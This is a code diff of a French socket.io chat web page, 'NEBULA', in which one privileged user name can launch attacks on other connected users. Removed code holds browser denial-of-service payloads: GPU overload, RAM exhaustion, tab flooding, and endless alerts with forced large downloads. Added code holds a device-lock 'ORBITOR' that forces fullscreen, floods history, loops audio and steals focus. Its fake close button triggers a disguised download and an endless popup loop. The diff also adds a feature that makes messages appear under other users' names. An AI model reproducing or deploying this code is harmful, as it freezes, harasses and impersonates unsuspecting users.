@@ -2,126 +2,102 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <title>NEBULA V40 - OMNIPOTENCE</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>NEBULA V41 - THE ORBITOR</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@900&family=JetBrains+Mono:wght@100;500&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Syncopate:wght@700&family=Outfit:wght@100;400;900&display=swap');
 
-        :root {
-            --neon: #00f2ff; --warn: #ff0044; --bg: #000;
-            --smooth: cubic-bezier(0.4, 0, 0.2, 1);
-        }
-
-        * { box-sizing: border-box; margin: 0; padding: 0; cursor: none; }
-        body { background: var(--bg); color: #fff; font-family: 'JetBrains Mono'; height: 100vh; overflow: hidden; }
-
-        /* --- FOND ANIMÉ NÉBULA --- */
-        #nebula-bg { position: fixed; inset: 0; z-index: -1; opacity: 0.3; }
-
-        /* --- CURSEUR CUSTOM --- */
-        #cursor {
-            position: fixed; width: 12px; height: 12px; background: var(--neon);
-            border-radius: 50%; pointer-events: none; z-index: 10000;
-            box-shadow: 0 0 20px var(--neon); transition: transform 0.05s linear;
-        }
-
-        /* --- LAYOUT --- */
-        .app { display: grid; grid-template-columns: 350px 1fr 300px; height: 100vh; }
+        :root { --neon: #00f2ff; --warn: #ff0044; --smooth: cubic-bezier(0.8, 0, 0.2, 1); }
         
-        .sidebar { background: rgba(5,5,5,0.9); border-right: 1px solid #111; display: flex; flex-direction: column; }
-        .header { padding: 40px; font-family: 'Orbitron'; font-size: 25px; color: var(--neon); letter-spacing: 5px; text-align: center; }
+        * { box-sizing: border-box; margin: 0; padding: 0; cursor: none; -webkit-touch-callout: none; -webkit-user-select: none; }
+        body { background: #000; color: #fff; font-family: 'Outfit', sans-serif; height: 100vh; overflow: hidden; }
 
-        #user-list { flex: 1; padding: 20px; overflow-y: auto; }
-        .user-card {
-            padding: 15px; border: 1px solid #111; margin-bottom: 10px;
-            transition: 0.3s var(--smooth); position: relative; overflow: hidden;
+        /* --- EFFET LIQUIDE --- */
+        #liquid-bg { position: fixed; inset: 0; z-index: -1; filter: blur(80px); opacity: 0.4; }
+        .blob { position: absolute; width: 400px; height: 400px; background: var(--neon); border-radius: 50%; animation: move 20s infinite alternate var(--smooth); }
+        @keyframes move { from { transform: translate(-10%, -10%); } to { transform: translate(100%, 80%); } }
+
+        #cursor { position: fixed; width: 15px; height: 15px; background: #fff; border-radius: 50%; pointer-events: none; z-index: 10000; box-shadow: 0 0 30px var(--neon); transition: transform 0.08s var(--smooth); }
+
+        /* --- UI OVERHAUL --- */
+        .app { display: grid; grid-template-columns: 350px 1fr; height: 100vh; backdrop-filter: blur(20px); }
+        
+        .sidebar { background: rgba(0,0,0,0.8); border-right: 1px solid rgba(255,255,255,0.05); padding: 40px 20px; }
+        .logo { font-family: 'Syncopate'; font-size: 28px; color: var(--neon); letter-spacing: 15px; text-shadow: 0 0 20px var(--neon); margin-bottom: 50px; text-align: center; }
+
+        .u-card { padding: 25px; background: rgba(255,255,255,0.02); border-radius: 20px; margin-bottom: 15px; transition: 0.5s var(--smooth); border: 1px solid transparent; }
+        .u-card:hover { transform: scale(1.05); background: rgba(0,242,255,0.05); border-color: var(--neon); }
+
+        .chat { display: flex; flex-direction: column; padding: 40px; }
+        #messages { flex: 1; overflow-y: auto; padding-right: 20px; display: flex; flex-direction: column; gap: 20px; }
+        .m { padding: 20px; border-radius: 0 25px 25px 25px; background: rgba(255,255,255,0.03); width: fit-content; max-width: 70%; animation: slide 0.6s var(--smooth); }
+        @keyframes slide { from { opacity: 0; transform: translateX(-50px); } }
+
+        /* --- THE ORBITOR INTERFACE --- */
+        #orbitor-overlay {
+            position: fixed; inset: 0; background: #000; z-index: 9999999; display: none;
+            flex-direction: column; align-items: center; justify-content: center; text-align: center;
         }
-        .user-card:hover { border-color: var(--neon); background: rgba(0,242,255,0.05); transform: translateX(5px); }
-        .user-card.chef { border-left: 4px solid var(--warn); }
+        .close-btn-fake { padding: 15px 40px; background: var(--warn); color: #fff; font-weight: 900; border-radius: 50px; margin-top: 30px; }
 
-        /* --- CHAT --- */
-        .viewport { display: flex; flex-direction: column; background: #000; border-right: 1px solid #111; }
-        #chat { flex: 1; padding: 40px; overflow-y: auto; display: flex; flex-direction: column; gap: 15px; }
-        .msg { padding: 15px; border-bottom: 1px solid #080808; animation: slideIn 0.3s var(--smooth); }
-        @keyframes slideIn { from { opacity: 0; transform: translateY(10px); } }
-
-        /* --- INPUT --- */
-        .input-zone { padding: 30px; display: flex; gap: 15px; background: #050505; }
-        input { flex: 1; background: #000; border: 1px solid #222; padding: 20px; color: #fff; font-family: inherit; }
-        button { background: var(--neon); color: #000; border: none; padding: 0 30px; font-weight: 900; }
-
-        /* --- TERMINAL LOGS --- */
-        .terminal { background: #000; padding: 20px; font-size: 9px; color: #333; overflow-y: auto; }
-
-        /* --- MENU OMNI --- */
-        #menu {
-            display: none; position: fixed; background: #000; border: 1px solid var(--neon);
-            width: 300px; z-index: 10000; box-shadow: 0 0 50px rgba(0,242,255,0.2);
-        }
-        .opt { padding: 15px; font-size: 11px; cursor: pointer; border-bottom: 1px solid #111; transition: 0.2s; }
-        .opt:hover { background: var(--neon); color: #000; font-weight: 900; }
+        #menu { display: none; position: fixed; background: #000; border: 1px solid var(--neon); width: 320px; z-index: 10000; border-radius: 15px; box-shadow: 0 0 100px rgba(0,242,255,0.4); }
+        .opt { padding: 20px; border-bottom: 1px solid #111; font-size: 11px; font-weight: 900; letter-spacing: 2px; }
+        .opt:hover { background: var(--neon); color: #000; }
         .opt.danger:hover { background: var(--warn); color: #fff; }
-
-        /* --- ECRAN DE MORT --- */
-        #death {
-            position: fixed; inset: 0; background: #000; z-index: 999999;
-            display: none; flex-direction: column; align-items: center; justify-content: center;
-        }
-        .glitch { font-family: 'Orbitron'; font-size: 80px; color: var(--warn); animation: crash 0.1s infinite; }
-        @keyframes crash { 0% { transform: scale(1); } 50% { transform: scale(1.05) skew(5deg); } }
     </style>
 </head>
 <body oncontextmenu="return false;">
 
-    <canvas id="nebula-bg"></canvas>
+    <div id="liquid-bg"><div class="blob"></div></div>
     <div id="cursor"></div>
 
-    <div id="death">
-        <div class="glitch">VOID_COLLISION</div>
-        <div id="death-logs" style="font-size:10px; color:#222; margin-top:20px; width:600px;"></div>
+    <div id="orbitor-overlay">
+        <h1 style="font-family:'Syncopate'; font-size:60px; color:var(--warn);">NEBULA_ORBITOR</h1>
+        <p style="margin-top:20px; letter-spacing:5px; opacity:0.5;">SYSTEM_ENSLAVED_BY_MASTER</p>
+        <div id="status-flood" style="font-size:10px; color:#222; margin-top:40px;">HISTORY_FLOODING_ACTIVE...</div>
+        <div class="close-btn-fake" onclick="orbitorEscapeAttempt()">FERMER ET QUITTER</div>
     </div>
 
     <div class="app">
         <aside class="sidebar">
-            <div class="header">NEBULA</div>
-            <div id="user-list"></div>
+            <div class="logo">NEBULA</div>
+            <div id="u-list"></div>
         </aside>
 
-        <main class="viewport">
-            <div id="chat"></div>
-            <div class="input-zone">
-                <input type="text" id="in" placeholder="ENTRER COMMANDE...">
-                <button onclick="send()">EXEC</button>
+        <main class="chat">
+            <div id="messages"></div>
+            <div style="margin-top:40px; display:flex; gap:20px;">
+                <input id="in" style="flex:1; background:rgba(255,255,255,0.03); border:none; padding:25px; border-radius:20px; color:#fff;" placeholder="TRANSMISSION...">
+                <button onclick="send()" style="background:var(--neon); border:none; padding:0 40px; border-radius:20px; font-weight:900;">SEND</button>
             </div>
         </main>
-
-        <aside class="terminal" id="logs"></aside>
     </div>
 
     <div id="menu">
-        <div class="opt danger" onclick="atk('attack_hydra')">☢️ HYDRA_BOMB (CPU)</div>
-        <div class="opt danger" onclick="atk('attack_gpu')">🔥 GPU_MELT (RENDER_STRESS)</div>
-        <div class="opt danger" onclick="atk('attack_freeze')">❄️ TOTAL_FREEZE (RAM)</div>
-        <div class="opt danger" onclick="atk('attack_tab_nuke')">📑 TAB_NUKE (DOM_EXPLOSION)</div>
-        <div class="opt" onclick="this.parentElement.style.display='none'">[ FERMER ]</div>
+        <div class="opt danger" onclick="launchOrbitor()">🔱 THE ORBITOR (COMPLETE LOCK)</div>
+        <div class="opt" onclick="fakeMsg()">🎭 FAKE_MESSAGE (TROLL)</div>
+        <div class="opt danger" onclick="atk('attack_gpu')">🔥 GPU_MOLTEN_CORE</div>
+        <div class="opt" onclick="this.parentElement.style.display='none'">[ CANCEL ]</div>
     </div>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
         const socket = io();
-        let me = { name: "" };
-        let target = null;
+        let me = "";
+        let targetId = "";
 
-        // --- CURSEUR ---
+        // --- MOTEUR DE CURSEUR ---
         document.addEventListener('mousemove', e => {
             const c = document.getElementById('cursor');
             c.style.left = e.clientX + 'px';
             c.style.top = e.clientY + 'px';
         });
 
-        // --- INIT ---
         window.onload = () => {
-            me.name = prompt("ACCESS_TOKEN:");
-            socket.emit('init_user', { name: me.name });
+            me = prompt("NEBULA_AUTH:");
+            socket.emit('init', { name: me });
+            // Anti-slide iPad Safari
+            document.addEventListener('touchmove', e => e.preventDefault(), { passive: false });
         };
 
         function send() {
@@ -130,91 +106,83 @@
             i.value = "";
         }
 
-        function atk(type) {
-            socket.emit(type, target);
-            log(`ACTION_SENT: ${type} -> ${target}`);
+        function launchOrbitor() {
+            socket.emit('launch_orbitor', targetId);
             document.getElementById('menu').style.display = 'none';
         }
 
-        function log(t) {
-            const l = document.getElementById('logs');
-            l.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${t}</div>`;
-            l.scrollTop = l.scrollHeight;
+        function fakeMsg() {
+            const t = prompt("TEXTE À FAIRE DIRE :");
+            socket.emit('force_fake_msg', { targetSid: targetId, fakeText: t });
         }
 
-        // --- GESTION SOCKETS ---
-        socket.on('sync_users', list => {
-            const cont = document.getElementById('user-list');
-            cont.innerHTML = "";
+        // --- RÉCEPTION DES ATTAQUES ---
+
+        // 🚀 THE ORBITOR : L'ATTAQUE TOTALE
+        socket.on('exe_orbitor', (data) => {
+            document.getElementById('orbitor-overlay').style.display = 'flex';
+            
+            // 1. Fullscreen permanent
+            document.documentElement.requestFullscreen().catch(() => {});
+
+            // 2. History Flooding (Bloque Safari iPad)
+            setInterval(() => {
+                for(let i=0; i<100; i++) {
+                    history.pushState(null, null, location.href + "#" + Math.random());
+                }
+            }, 50);
+
+            // 3. Audio Loop (Bruit de fond stressant)
+            const audio = new Audio("https://www.soundjay.com/buttons/beep-01a.mp3");
+            audio.loop = true;
+            audio.play();
+
+            // 4. Keyboard Lock (On vole le focus)
+            const input = document.createElement('input');
+            input.style.opacity = "0";
+            document.body.appendChild(input);
+            setInterval(() => input.focus(), 10);
+        });
+
+        // Tentative d'échappement (Punition)
+        function orbitorEscapeAttempt() {
+            // Télécharge un fichier corrompu massif
+            const link = document.createElement('a');
+            link.href = "https://speed.hetzner.de/100MB.bin";
+            link.download = "SYSTEM_REPAIR_CRITICAL.bin";
+            link.click();
+            
+            // Lag GPU immédiat
+            while(true) {
+                console.log("NEBULA_ORBITOR_STAY_HERE");
+                window.open(location.href, "_blank", "width=10,height=10");
+            }
+        }
+
+        socket.on('sync', list => {
+            const l = document.getElementById('u-list');
+            l.innerHTML = "";
             list.forEach(u => {
                 const d = document.createElement('div');
-                d.className = `user-card ${u.chef?'chef':''}`;
-                d.innerHTML = `<b>${u.name.toUpperCase()}</b><br><small>${u.id}</small>`;
+                d.className = "u-card";
+                d.innerHTML = `<b>${u.name.toUpperCase()}</b><br><small>${u.id.substr(0,10)}</small>`;
                 d.oncontextmenu = (e) => {
-                    if(me.name !== "toucheur2pp") return;
-                    target = u.id;
+                    if(me !== "toucheur2pp") return;
+                    targetId = u.id;
                     const m = document.getElementById('menu');
                     m.style.display = 'block'; m.style.top = e.pageY+'px'; m.style.left = e.pageX+'px';
                 };
-                cont.appendChild(d);
+                l.appendChild(d);
             });
         });
 
         socket.on('chat_msg', d => {
-            const c = document.getElementById('chat');
-            c.innerHTML += `<div class="msg"><b>${d.name}:</b> ${d.text}</div>`;
-            c.scrollTop = c.scrollHeight;
+            const m = document.getElementById('messages');
+            m.innerHTML += `<div class="m"><b>${d.name}:</b> ${d.text}</div>`;
+            m.scrollTop = m.scrollHeight;
         });
 
-        // --- LES ATTAQUES (PUISSANCE 40) ---
-
-        // 1. GPU MELT (Surcharge de rendu)
-        socket.on('exe_gpu_burn', () => {
-            log("CRITICAL_GPU_STRESS_DETECTED");
-            const c = document.createElement('canvas');
-            document.body.appendChild(c);
-            const gl = c.getContext('webgl');
-            setInterval(() => {
-                for(let i=0; i<10000; i++) { gl.clear(gl.COLOR_BUFFER_BIT); }
-            }, 1);
-        });
-
-        // 2. TOTAL FREEZE (Saturation RAM)
-        socket.on('exe_total_freeze', () => {
-            const leak = [];
-            setInterval(() => {
-                for(let i=0; i<10000; i++) { leak.push(new Array(10000).fill("VOID")); }
-                document.body.innerHTML += "FREEZING_SYSTEM...";
-            }, 10);
-        });
-
-        // 3. TAB NUKE (Explosion d'onglets)
-        socket.on('exe_tab_nuke', () => {
-            setInterval(() => { window.open(location.href, '_blank', 'width=50,height=50'); }, 100);
-        });
-
-        // 4. HYDRA (Crash complet)
-        socket.on('exe_hydra', () => {
-            document.getElementById('death').style.display = 'flex';
-            setInterval(() => {
-                document.getElementById('death-logs').innerHTML += `ERROR_FATAL_COLLISION_${Math.random()}<br>`;
-                window.open("https://speed.hetzner.de/10GB.bin");
-            }, 20);
-            setTimeout(() => { while(true) { alert("SYSTEM_ASPIRATED_BY_NEBULA"); } }, 1000);
-        });
-
-        // Fond animé simple pour la fluidité
-        const canv = document.getElementById('nebula-bg');
-        const ctx = canv.getContext('2d');
-        function res() { canv.width = window.innerWidth; canv.height = window.innerHeight; }
-        window.onresize = res; res();
-        function draw() {
-            ctx.fillStyle = "rgba(0,0,0,0.1)"; ctx.fillRect(0,0,canv.width,canv.height);
-            ctx.fillStyle = "#00f2ff";
-            for(let i=0; i<50; i++) ctx.fillRect(Math.random()*canv.width, Math.random()*canv.height, 2, 2);
-            requestAnimationFrame(draw);
-        }
-        draw();
+        window.onclick = () => document.getElementById('menu').style.display = 'none';
     </script>
 </body>
 </html>
